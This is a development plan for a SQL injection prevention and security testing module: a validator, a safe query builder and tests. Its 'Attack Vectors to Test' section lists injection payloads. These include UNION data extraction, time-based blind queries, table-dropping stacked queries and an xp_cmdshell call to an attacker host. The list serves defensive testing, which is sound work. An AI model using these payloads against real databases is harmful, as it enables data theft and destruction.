# Week 4: SQL Injection Prevention & Security Testing

**Duration:** 3 days (2026-04-10 to 2026-04-12)
**Budget:** $175
**Target:** 600 LOC, 50 tests

---

## Objectives

Implement comprehensive SQL injection prevention and security testing framework.

### Core Requirements

1. **SQL Injection Prevention**
   - Parameterized query validation
   - Input sanitization
   - Query builder with safe defaults
   - Blacklist/whitelist validation
   - Escape mechanisms

2. **Query Validation**
   - Detect unsafe patterns (string concatenation, dynamic SQL)
   - Validate parameter binding
   - Check for SQL keywords in user input
   - Validate table/column names

3. **Input Sanitization**
   - Strip SQL metacharacters
   - Validate data types
   - Length limits
   - Format validation (email, UUID, etc.)

4. **Security Testing Framework**
   - SQL injection attack vectors
   - Fuzzing with malicious payloads
   - Boundary testing
   - Integration tests with real database

5. **Static Analysis**
   - Detect unsafe query patterns in code
   - Lint rules for SQL safety
   - Code review checklist

---

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│  Application Code                                       │
│  - Repository operations                                │
│  - Query building                                       │
└────────────────┬────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────┐
│  SqlSafetyValidator                                     │
│  - validateQuery(sql, params)                           │
│  - sanitizeInput(value, type)                           │
│  - detectInjection(input)                               │
└────────────────┬────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────┐
│  SafeQueryBuilder                                       │
│  - select(table, columns, where)                        │
│  - insert(table, data)                                  │
│  - update(table, data, where)                           │
│  - delete(table, where)                                 │
│  - Always uses parameterized queries                    │
└─────────────────────────────────────────────────────────┘
```

---

## Implementation Plan

### Day 1: SQL Injection Prevention (200 LOC, 20 tests)

**Files:**
- `lib/security/sql_safety_validator.dart` (120 LOC)
  - SqlSafetyValidator class
  - detectInjection() - detect SQL injection patterns
  - validateQuery() - validate query safety
  - sanitizeInput() - sanitize user input
  - Common attack patterns (UNION, OR 1=1, etc.)

- `lib/security/input_sanitizer.dart` (80 LOC)
  - InputSanitizer class
  - Type-specific sanitization
  - Length validation
  - Format validation

**Tests:**
- `test/security/sql_injection_test.dart` (20 tests)
  - Test common injection patterns
  - Test UNION attacks
  - Test boolean-based attacks
  - Test time-based attacks
  - Test stacked queries

### Day 2: Safe Query Builder (250 LOC, 20 tests)

**Files:**
- `lib/security/safe_query_builder.dart` (150 LOC)
  - SafeQueryBuilder class
  - SELECT with parameterized WHERE
  - INSERT with parameter binding
  - UPDATE with parameter binding
  - DELETE with parameter binding
  - Table/column name validation

- `lib/security/query_validator.dart` (100 LOC)
  - QueryValidator class
  - Detect string concatenation
  - Validate parameter usage
  - Check for dynamic SQL

**Tests:**
- `test/security/safe_query_builder_test.dart` (15 tests)
- `test/security/query_validator_test.dart` (5 tests)

### Day 3: Security Testing & Integration (150 LOC, 10 tests)

**Files:**
- `test/security/sql_injection_integration_test.dart` (150 LOC)
  - Real database tests
  - Attack vector fuzzing
  - Boundary testing
  - Performance testing

**Documentation:**
- `ADR-006-sql-injection-prevention.md`
- `WEEK4_COMPLETE.md`

---

## Attack Vectors to Test

### 1. Classic SQL Injection
```sql
' OR '1'='1
' OR 1=1--
' OR 'a'='a
admin'--
admin' #
```

### 2. UNION-based Injection
```sql
' UNION SELECT NULL--
' UNION SELECT username, password FROM users--
' UNION ALL SELECT NULL, NULL, NULL--
```

### 3. Boolean-based Blind Injection
```sql
' AND 1=1--
' AND 1=2--
' AND SUBSTRING(version(),1,1)='5'--
```

### 4. Time-based Blind Injection
```sql
'; WAITFOR DELAY '00:00:05'--
'; SELECT SLEEP(5)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

### 5. Stacked Queries
```sql
'; DROP TABLE users--
'; DELETE FROM users WHERE 1=1--
'; UPDATE users SET password='hacked'--
```

### 6. Second-order Injection
```sql
-- Store: admin'--
-- Later use in query causes injection
```

### 7. Out-of-band Injection
```sql
'; EXEC xp_cmdshell('nslookup attacker.com')--
```

---

## Success Criteria

- ✅ All common injection patterns detected
- ✅ SafeQueryBuilder prevents all injection types
- ✅ Input sanitization blocks malicious input
- ✅ Integration tests with real PostgreSQL
- ✅ 100% test coverage
- ✅ All tests passing
- ✅ Performance: <1ms validation overhead

---

## Security Standards

### OWASP Top 10
- **A03:2021 - Injection:** Parameterized queries, input validation

### CWE
- **CWE-89:** SQL Injection
- **CWE-564:** SQL Injection: Hibernate
- **CWE-943:** Improper Neutralization of Special Elements

### NIST
- **NIST SP 800-53:** SI-10 (Information Input Validation)

---

## Risk Mitigation

### SQL Injection
- **Risk:** Attacker executes arbitrary SQL
- **Mitigation:**
  - Parameterized queries (ALWAYS)
  - Input validation
  - Least privilege database user
  - WAF (Web Application Firewall)

### Bypass Attempts
- **Risk:** Attacker bypasses validation
- **Mitigation:**
  - Multiple validation layers
  - Whitelist approach
  - Regular expression validation
  - Type checking

### Performance Impact
- **Risk:** Validation slows queries
- **Mitigation:**
  - Efficient regex patterns
  - Caching validation results
  - Async validation where possible

---

## Timeline

| Day | Date | Tasks | LOC | Tests |
|-----|------|-------|-----|-------|
| 1 | 2026-04-10 | SQL injection prevention | 200 | 20 |
| 2 | 2026-04-11 | Safe query builder | 250 | 20 |
| 3 | 2026-04-12 | Security testing | 150 | 10 |

**Total:** 600 LOC, 50 tests, $175

---

## Next Steps

After Week 4 completion:
- Week 5: Performance Optimization
- Week 6: Monitoring & Alerting
- Week 7: Backup & Recovery
